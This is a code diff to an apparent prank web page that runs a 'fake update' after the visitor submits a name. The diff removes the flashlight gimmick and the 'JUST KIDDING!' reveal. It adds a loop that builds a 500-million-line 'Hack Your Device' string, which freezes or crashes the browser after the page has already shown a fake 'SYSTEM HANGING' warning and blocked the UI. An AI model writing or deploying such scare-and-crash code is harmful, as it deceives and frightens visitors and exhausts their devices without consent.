@@ -30,21 +30,6 @@
     <button onclick="startFakeUpdate()" style="padding: 5px 10px; font-size: 16px;">Submit</button>
     
     <script>
-        let stream;
-        async function toggleFlashlight(on) {
-            try {
-                if (on) {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", torch: true } });
-                    const track = stream.getVideoTracks()[0];
-                    await track.applyConstraints({ advanced: [{ torch: true }] });
-                } else {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            } catch (err) {
-                console.log("Flashlight not supported: ", err);
-            }
-        }
-
         function startFakeUpdate() {
             const name = document.getElementById('username').value;
             if (!name) {
@@ -82,7 +67,6 @@
                     if (countdown <= 0) {
                         clearInterval(interval);
                         document.body.innerHTML = '<h1 class="error">SYSTEM HANGING... DO NOT TOUCH!</h1>';
-                        toggleFlashlight(true);
                         
                         // Simulate system hang by freezing UI
                         let start = Date.now();
@@ -90,8 +74,16 @@
                             // This loop will freeze the UI for 10 seconds
                         }
                         
-                        toggleFlashlight(false);
-                        document.body.innerHTML = '<h1 class="error">JUST KIDDING! 😆</h1>';
+                        document.body.innerHTML = '<h1 class="error">Byee!</h1>';
+                        
+                        // JavaScript While Loop Addition
+                        let text = "";
+                        let i = 0;
+                        while (i < 500000000) {
+                            text += "<br>Hack Your Device " + i;
+                            i++;
+                        }
+                        document.body.innerHTML += '<p>' + text + '</p>';
                     }
                 }, 1000);
             }, 16000);
